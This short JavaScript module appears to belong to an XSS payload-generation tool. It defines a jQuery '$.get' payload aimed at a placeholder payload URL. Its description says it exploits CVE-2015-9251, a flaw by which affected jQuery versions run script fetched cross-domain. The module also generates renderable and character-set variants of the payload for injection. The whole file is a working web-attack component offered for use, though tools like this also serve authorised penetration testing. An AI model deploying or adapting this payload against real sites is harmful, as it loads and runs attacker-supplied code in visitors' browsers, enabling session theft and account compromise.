const generateCharsets = require('../lib/charsets/generate')
const renderable = require('../lib/renderable')

const script = '$.get("$$PAYLOAD_URL$$")'

module.exports = {
    description: `Standard JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
    script: renderable(script),
    charsets: generateCharsets(script)
}

